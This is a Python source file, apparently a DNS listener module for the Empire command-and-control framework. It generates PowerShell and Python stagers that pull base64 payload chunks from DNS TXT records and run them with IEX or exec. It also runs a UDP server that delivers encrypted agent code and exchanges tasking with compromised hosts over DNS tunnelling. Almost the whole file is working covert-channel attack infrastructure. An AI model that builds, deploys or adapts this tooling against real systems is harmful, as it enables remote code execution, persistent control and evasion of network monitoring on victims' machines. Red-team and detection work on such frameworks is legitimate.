import base64
import logging
import random
import re
import socket
import struct
import threading
import time
import os

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import ed25519

from empire.server.common import helpers, packets, templating, encryption
from empire.server.common.encryption import AESCipher
from empire.server.utils import data_util
from empire.server.core.db.base import SessionLocal

LOG_NAME_PREFIX = __name__
log = logging.getLogger(__name__)

class Listener:
    def __init__(self, mainMenu):
        self.mainMenu = mainMenu
        self.running = False
        self.server = None
        self.instance_log = log
        
        self.info = {
            "Name": "DNS",
            "Authors": [{"Name": "Axel Lenroué", "Handle": "@Affell", "Link": "https://github.com/affell"}],
            "Description": "Starts a DNS listener that uses chunked records/A/TXT for communication.",
            "Category": "client_server",
            "Comments": [],
            "Software": "",
            "Techniques": [],
            "Tactics": [],
        }

        self.options = {
            "Name": {
                "Description": "Name for the listener.",
                "Required": True,
                "Value": "dns",
            },
            "Host": {
                "Description": "Hostname/IP for staging. (e.g. ns1.domain.com)",
                "Required": True,
                "Value": helpers.lhost(),
            },
            "BindIP": {
                "Description": "The IP to bind to on the control server.",
                "Required": True,
                "Value": "0.0.0.0",
            },
            "Port": {
                "Description": "Port for the listener.",
                "Required": True,
                "Value": "53",
            },
            "Launcher": {
                "Description": "Launcher string.",
                "Required": True,
                "Value": 'powershell -noP -sta -w 1 -enc ',
            },
            "StagingKey": {
                "Description": "Staging key for initial agent negotiation.",
                "Required": True,
                "Value": "2c103f2c4ed1e59c0847327745e6eb48",
            },
            "DefaultDelay": {
                "Description": "Agent delay/reach back interval (in seconds).",
                "Required": True,
                "Value": 5,
                "Strict": False,
            },
            "DefaultJitter": {
                "Description": "Jitter in agent reachback interval (0.0-1.0).",
                "Required": True,
                "Value": 0.0,
                "Strict": False,
            },
            "DefaultLostLimit": {
                "Description": "Number of missed checkins before exiting",
                "Required": True,
                "Value": 60,
                "Strict": False,
            },
            "DefaultProfile": {
                "Description": "Default profile for the agent.",
                "Required": True,
                "Value": "/admin/get.php,/news.php,/login/process.jsp|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
                "Strict": False,
            },
            "KillDate": {
                "Description": "Date for the listener to exit (MM/dd/yyyy).",
                "Required": False,
                "Value": "",
            },
            "WorkingHours": {
                "Description": "Hours for the agent to operate (09:00-17:00).",
                "Required": False,
                "Value": "",
            }
        }
        
        self.agent_private_cert_key_object = ed25519.Ed25519PrivateKey.generate()
        self.server_private_cert_key_object = ed25519.Ed25519PrivateKey.generate()
        self.agent_private_cert_key = self.agent_private_cert_key_object.private_bytes_raw()
        self.agent_public_cert_key = encryption.publickey_unsafe(self.agent_private_cert_key)
        self.server_private_cert_key = self.server_private_cert_key_object.private_bytes_raw()
        self.server_public_cert_key = encryption.publickey_unsafe(self.server_private_cert_key)

        self.chunk_buffer = {}
        self.stage_downloads = {}

    def default_response(self):
        return ""

    def validate_options(self):
        return True, ""

    def generate_launcher(self, encode=True, obfuscate=False, obfuscation_command="", user_agent="default", proxy="default", proxy_creds="default", stager_retries="0", language=None, safe_checks="", listener_name=None, bypasses=None):
        if not language:
            log.error(f"{listener_name}: listeners/dns generate_launcher(): no language specified!")
            return None

        launcher = self.options["Launcher"]["Value"]
        staging_key = self.options["StagingKey"]["Value"]
        domain = self.options["Host"]["Value"]

        if language == "powershell":
            stager = '$ErrorActionPreference = "SilentlyContinue";'
            
            # Prebuild routing packet for STAGE0
            routingPacket = packets.build_routing_packet(
                staging_key,
                sessionID="00000000",
                language="POWERSHELL",
                meta="STAGE0",
                additional="None",
                encData="",
            )
            b64Routing = base64.urlsafe_b64encode(routingPacket).decode('utf-8').replace('=','')
            
            stager += f'$Domain="{domain}";$TID=Get-Random -Min 1000 -Max 9999;'
            stager += f'$Routing="{b64Routing}";'
            stager += '$Query="r$($TID)c0t1.$Routing.xyz";'
            stager += 'Resolve-DnsName -Name $Query -Server $Domain -Type A -DnsOnly -ErrorAction SilentlyContinue;'
            
            # Launcher loops to download chunks of STAGE1
            stager += '$Stage1="";$c=0;while($true){'
            stager += ' $Q="s$($TID)c$c.xyz";$R=Resolve-DnsName -Server $Domain -Name $Q -Type TXT -DnsOnly -ErrorAction SilentlyContinue;'
            stager += ' if($R -and $R.Type -eq "TXT"){$Stage1+=($R.Strings -join "");$c++;Start-Sleep -Milliseconds 50}else{break}'
            stager += '};'
            stager += 'if($Stage1){$Pad=4-($Stage1.Length%4);if($Pad -lt 4 -and $Pad -gt 0){$Stage1+="="*$Pad};$Dec=[Convert]::FromBase64String($Stage1.Replace("-","+").Replace("_","/"));IEX([Text.Encoding]::UTF8.GetString($Dec))}'

            if encode:
                return helpers.powershell_launcher(stager, launcher)
            return stager
            
        elif language in ["python", "ironpython"]:
            routingPacket = packets.build_routing_packet(
                staging_key,
                sessionID="00000000",
                language="PYTHON",
                meta="STAGE0",
                additional="None",
                encData="",
            )
            b64Routing = base64.urlsafe_b64encode(routingPacket).decode('utf-8').replace('=','')
            
            p_stager = f"""import socket,struct,base64,random,os
d="{domain}"
t=random.randint(1000,9999)
x=next((l.split()[1] for l in open('/etc/resolv.conf') if 'nameserver' in l),"8.8.8.8") if os.name=="posix" else "8.8.8.8"
def s(n,q):
 p=struct.pack(">HHHHHH",t,256,1,0,0,0)+b''.join(bytes([len(i)])+i.encode()for i in n.split('.'))+b'\\x00'+struct.pack(">HH",q,1)
 k=socket.socket(2,2);k.settimeout(2)
 try:
  k.sendto(p,(x,53))
  r=k.recv(4096)
  if q==16 and len(r)>len(p):
   l=r[len(p)+10:len(p)+12]
   if struct.unpack(">H",l)[0]>0:return r[len(p)+13:len(p)+13+r[len(p)+12]]
 except:pass
s(f"r{{t}}c0t1.{b64Routing}.{{d}}",1)
r=b""
c=0
while 1:
 v=s(f"s{{t}}c{{c}}.{{d}}",16)
 if v:r+=v;c+=1
 else:break
if r:exec(base64.b64decode(r.replace(b"-",b"+").replace(b"_",b"/")))"""
            return p_stager

        return None

    def generate_stager(self, listenerOptions, encode=False, encrypt=True, obfuscate=False, obfuscation_command="", language=None):
        if not language:
            return b""
        
        if language.lower() == "powershell":
            template_path = [
                os.path.join(self.mainMenu.installPath, "data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "data/agent/stagers"),
            ]
            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("dns/dns.ps1")

            raw_key_bytes = self.agent_private_cert_key_object.private_bytes(
                encoding=serialization.Encoding.Raw,
                format=serialization.PrivateFormat.Raw,
                encryption_algorithm=serialization.NoEncryption(),
            )
            private_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)
            
            raw_key_bytes = self.agent_private_cert_key_object.public_key().public_bytes(
                encoding=serialization.Encoding.Raw,
                format=serialization.PublicFormat.Raw,
            )
            public_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)
            
            raw_key_bytes = self.server_private_cert_key_object.public_key().public_bytes(
                encoding=serialization.Encoding.Raw,
                format=serialization.PublicFormat.Raw,
            )
            server_public_key_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)

            template_options = {
                "delay": listenerOptions["DefaultDelay"]["Value"],
                "jitter": listenerOptions["DefaultJitter"]["Value"],
                "profile": listenerOptions["DefaultProfile"]["Value"],
                "kill_date": listenerOptions["KillDate"]["Value"] if listenerOptions["KillDate"]["Value"] else "",
                "working_hours": listenerOptions["WorkingHours"]["Value"] if listenerOptions["WorkingHours"]["Value"] else "",
                "lost_limit": listenerOptions["DefaultLostLimit"]["Value"],
                "host": self.options["Host"]["Value"],
                "staging_key": self.options["StagingKey"]["Value"],
                "obfuscate": False,
                "obfuscation_command": "",
                "agent_private_cert_key": private_key_array,
                "agent_public_cert_key": public_key_array,
                "server_public_cert_key": server_public_key_array,
            }
            code = template.render(template_options)
            return code.encode("utf-8")
            
        elif language in ["python", "ironpython"]:
            template_path = [
                os.path.join(self.mainMenu.installPath, "data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "data/agent/stagers"),
            ]
            eng = templating.TemplateEngine(template_path)
            # Use Python HTTP stager to bootstrap the agent logic (which then pulls comms.py)
            template = eng.get_template("http/http.py")
            template_options = {
                "delay": 5,
                "jitter": 0.0,
                "profile": "/admin/get.php|Mozilla/5.0",
                "kill_date": "03/05/2026",
                "working_hours": "00:00-23:59",
                "lost_limit": 60,
                "host": self.options["Host"]["Value"],
            }
            code = template.render(template_options)
            return code.encode("utf-8")
            
        return b""

    def generate_agent(self, listenerOptions, language=None, obfuscate=False, obfuscation_command="", version=""):
        if not language:
            return None

        language = language.lower()
        delay = listenerOptions["DefaultDelay"]["Value"]
        jitter = listenerOptions["DefaultJitter"]["Value"]
        profile = listenerOptions["DefaultProfile"]["Value"]
        lostLimit = listenerOptions["DefaultLostLimit"]["Value"]
        b64DefaultResponse = base64.b64encode(self.default_response().encode("UTF-8"))

        if language == "powershell":
            with open(self.mainMenu.installPath + "/data/agent/agent.ps1") as f:
                code = f.read()

            code = helpers.strip_powershell_comments(code)
            code = code.replace("$AgentDelay = 60", f"$AgentDelay = {delay}")
            code = code.replace("$AgentJitter = 0", f"$AgentJitter = {jitter}")
            code = code.replace(
                '$Profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
                f'$Profile = "{profile}"',
            )
            code = code.replace("$LostLimit = 60", f"$LostLimit = {lostLimit}")
            code = code.replace(
                '$DefaultResponse = ""',
                f'$DefaultResponse = "{b64DefaultResponse.decode("UTF-8")}"',
            )

            if obfuscate:
                code = self.mainMenu.obfuscationv2.obfuscate(
                    code,
                    obfuscation_command=obfuscation_command,
                )
            return code

        return None

    def generate_comms(self, listenerOptions, language=None):
        if language.lower() == "powershell":
            template_path = [
                os.path.join(self.mainMenu.installPath, "data/agent/stagers"),
                os.path.join(self.mainMenu.installPath, "data/agent/stagers"),
            ]
            eng = templating.TemplateEngine(template_path)
            template = eng.get_template("dns/comms.ps1")
            
            raw_key_bytes = self.agent_private_cert_key_object.private_bytes(
                encoding=serialization.Encoding.Raw,
                format=serialization.PrivateFormat.Raw,
                encryption_algorithm=serialization.NoEncryption(),
            )
            powershell_array = ",".join(f"0x{b:02x}" for b in raw_key_bytes)

            template_options = {
                "host": self.options["Host"]["Value"],
                "agent_private_cert_key": powershell_array,
                "agent_public_cert_key": self.agent_public_cert_key,
                "server_public_cert_key": self.server_public_cert_key,
            }
            return template.render(template_options)
        return b""

    def start(self):
        self.running = True
        self.server = threading.Thread(target=self.start_server, args=(self.options,))
        self.server.daemon = True
        self.server.start()
        return True

    def start_server(self, listenerOptions):
        bind_ip = listenerOptions["BindIP"]["Value"]
        port = int(listenerOptions["Port"]["Value"])
        staging_key = listenerOptions["StagingKey"]["Value"]

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        # Allows quick restart
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((bind_ip, port))
        self.sock.settimeout(2.0)

        while self.running:
            try:
                data, addr = self.sock.recvfrom(4096)
                if not data:
                    continue

                # Manual DNS parsing
                tx_id, flags, qdcount, ancount, nscount, arcount = struct.unpack("!HHHHHH", data[:12])
                i = 12
                qname_parts = []
                while data[i] != 0:
                    length = data[i]
                    qname_parts.append(data[i+1:i+1+length].decode('utf-8'))
                    i += length + 1
                qname_str = ".".join(qname_parts)
                qtype, qclass = struct.unpack("!HH", data[i+1:i+5])

                response_body = None
                
                # Check for stage download chunks (s[TransID]c[ChunkID].[Domain])
                match_stage = re.match(r"^s(\d+)c(\d+)\.", qname_str, re.IGNORECASE)
                if match_stage:
                    req_id, chunk_idx = match_stage.groups()
                    chunk_idx = int(chunk_idx)

                    if req_id in self.stage_downloads:
                        if chunk_idx < len(self.stage_downloads[req_id]):
                            response_body = self.stage_downloads[req_id][chunk_idx]
                        else:
                            log.error(f"[DNS] chunk {chunk_idx} OUT OF BOUNDS for {req_id}")
                    else:
                        log.error(f"[DNS] req_id {req_id} NOT FOUND in stage_downloads")

                # Check for routing protocol: r[TransID]c[ChunkID]t[TotalChunks].[Base64].[Domain]
                match_route = re.match(r"^r(\d+)c(\d+)t(\d+)\.(.*?)\.(.*)", qname_str, re.IGNORECASE)
                if match_route:
                    req_id, chunk_idx, total_chunks, b64_chunk, domain = match_route.groups()
                    chunk_idx, total_chunks = int(chunk_idx), int(total_chunks)
                    
                    if req_id not in self.chunk_buffer:
                        self.chunk_buffer[req_id] = [None] * total_chunks
                        
                    self.chunk_buffer[req_id][chunk_idx] = b64_chunk
                    
                    if None not in self.chunk_buffer[req_id]:
                        b64_payload = "".join(self.chunk_buffer[req_id])
                        b64_payload = b64_payload.replace("-", "+").replace("_", "/")
                        pad_count = 4 - (len(b64_payload) % 4)
                        if pad_count < 4:
                            b64_payload += "=" * pad_count
                            
                        try:
                            request_data = base64.b64decode(b64_payload)
                            
                            dataResults = self.mainMenu.agentcommsv2.handle_agent_data(
                                staging_key,
                                self.agent_public_cert_key,
                                self.server_private_cert_key,
                                self.server_public_cert_key,
                                request_data,
                                listenerOptions,
                                addr[0]
                            )
                            
                            if dataResults and len(dataResults) > 0:
                                for language, results in dataResults:
                                    if results == b"STAGE0" or results == "STAGE0":
                                        log.info(f"[DNS] Sending {language} STAGE1 to {addr[0]}")

                                        # Generating STAGE1 payload
                                        stager_data = self.generate_stager(language=language, listenerOptions=listenerOptions)
                                        b64_stager = base64.urlsafe_b64encode(stager_data).decode('utf-8').replace('=','')

                                        # Store in buffer for chunking (200 bytes chunks max for DNS TXT)
                                        self.stage_downloads[req_id] = [b64_stager[k:k+200] for k in range(0, len(b64_stager), 200)]
                                        log.info(f"[DNS] Stager buffered in {len(self.stage_downloads[req_id])} chunks for req_id {req_id}")

                                    elif isinstance(results, bytes) and results.startswith(b"STAGE2"):
                                        sessionID = results.split(b" ")[1].strip().decode("UTF-8")
                                        sessionKey = self.mainMenu.agentcommsv2.agents[sessionID]["sessionKey"]
                                        if isinstance(sessionKey, str):
                                            sessionKey = bytes.fromhex(sessionKey)

                                        log.info(f"[DNS] Sending agent (stage 2) to {sessionID} at {addr[0]}")

                                        agentCode = self.generate_agent(
                                            language=language,
                                            listenerOptions=listenerOptions,
                                        )
                                        if not agentCode:
                                            agentCode = ""

                                        encryptedAgent = AESCipher.encrypt_then_hmac(
                                            sessionKey, agentCode.encode("UTF-8") if isinstance(agentCode, str) else agentCode
                                        )
                                        stage2_response = packets.build_routing_packet(
                                            staging_key, sessionID, language, encData=encryptedAgent
                                        )

                                        job_id = str(random.randint(10000, 99999))
                                        b64_stage2 = base64.urlsafe_b64encode(stage2_response).decode('utf-8').replace('=', '')
                                        self.stage_downloads[job_id] = [b64_stage2[k:k+200] for k in range(0, len(b64_stage2), 200)]
                                        log.info(f"[DNS] Agent code buffered in {len(self.stage_downloads[job_id])} chunks for JOB:{job_id} ({len(stage2_response)} bytes)")
                                        response_body = f"JOB:{job_id}"

                                    elif isinstance(results, str) and results.startswith("STAGE2"):
                                        sessionID = results.split(" ")[1].strip()
                                        sessionKey = self.mainMenu.agentcommsv2.agents[sessionID]["sessionKey"]
                                        if isinstance(sessionKey, str):
                                            sessionKey = bytes.fromhex(sessionKey)

                                        log.info(f"[DNS] Sending agent (stage 2) to {sessionID} at {addr[0]}")

                                        agentCode = self.generate_agent(
                                            language=language,
                                            listenerOptions=listenerOptions,
                                        )
                                        if not agentCode:
                                            agentCode = ""

                                        encryptedAgent = AESCipher.encrypt_then_hmac(
                                            sessionKey, agentCode.encode("UTF-8") if isinstance(agentCode, str) else agentCode
                                        )
                                        stage2_response = packets.build_routing_packet(
                                            staging_key, sessionID, language, encData=encryptedAgent
                                        )

                                        job_id = str(random.randint(10000, 99999))
                                        b64_stage2 = base64.urlsafe_b64encode(stage2_response).decode('utf-8').replace('=', '')
                                        self.stage_downloads[job_id] = [b64_stage2[k:k+200] for k in range(0, len(b64_stage2), 200)]
                                        log.info(f"[DNS] Agent code buffered in {len(self.stage_downloads[job_id])} chunks for JOB:{job_id} ({len(stage2_response)} bytes)")
                                        response_body = f"JOB:{job_id}"

                                    elif isinstance(results, bytes) and results.startswith(b"ERROR:"):
                                        log.error(f"[DNS] Agent from {addr[0]} Error: {results}")
                                    elif isinstance(results, str) and results.startswith("ERROR:"):
                                        log.error(f"[DNS] Agent from {addr[0]} Error: {results}")
                                    elif results:
                                        if isinstance(results, str):
                                            results = results.encode("UTF-8")
                                        
                                        # If results are large, use staging buffer
                                        if len(results) > 200: 
                                            import random
                                            job_id = random.randint(10000, 99999)
                                            b64_response = base64.urlsafe_b64encode(results).decode('utf-8').replace('=', '')
                                            self.stage_downloads[str(job_id)] = [b64_response[k:k+200] for k in range(0, len(b64_response), 200)]
                                            log.info(f"[DNS] Buffered large response {len(results)} bytes into JOB:{job_id} ({len(self.stage_downloads[str(job_id)])} chunks)")
                                            response_body = f"JOB:{job_id}"
                                        else:
                                            # Standard small response
                                            response_b64 = base64.b64encode(results).decode('utf-8')
                                            response_body = response_b64.replace('+', '-').replace('/', '_').replace('=', '')
                                        
                        except Exception as e:
                            log.error(f"[!] Error in Data Handling DNS: {e}")
                            
                        del self.chunk_buffer[req_id]
                
                # Build UDP Response
                response = bytearray(data[:12])
                response[2] ^= 0x80 # QR = 1
                response[3] = 0x00 # No error
                
                struct.pack_into("!H", response, 6, 1) # ANCOUNT = 1
                response.extend(data[12:i+5]) # Question
                
                response.extend(b"\xc0\x0c") # Name pointer
                if qtype == 16 and response_body: # TXT request
                    response.extend(struct.pack("!H", 16)) # TXT
                    response.extend(struct.pack("!H", 1)) # IN
                    response.extend(struct.pack("!L", 60)) # TTL
                    
                    ans_bytes = response_body.encode('utf-8')
                    txt_data = b"".join(bytes([len(ans_bytes[k:k+255])]) + ans_bytes[k:k+255] for k in range(0, len(ans_bytes), 255))
                    response.extend(struct.pack("!H", len(txt_data)))
                    response.extend(txt_data)
                else:
                    # Default A response
                    response.extend(struct.pack("!H", 1)) # A
                    response.extend(struct.pack("!H", 1)) # IN
                    response.extend(struct.pack("!L", 60)) # TTL
                    response.extend(struct.pack("!H", 4)) # Data len
                    response.extend(socket.inet_aton("1.2.3.4"))

                self.sock.sendto(response, addr)

            except socket.timeout:
                pass
            except Exception as e:
                pass
        
        try:
            self.sock.close()
        except:
            pass

    def shutdown(self):
        self.running = False
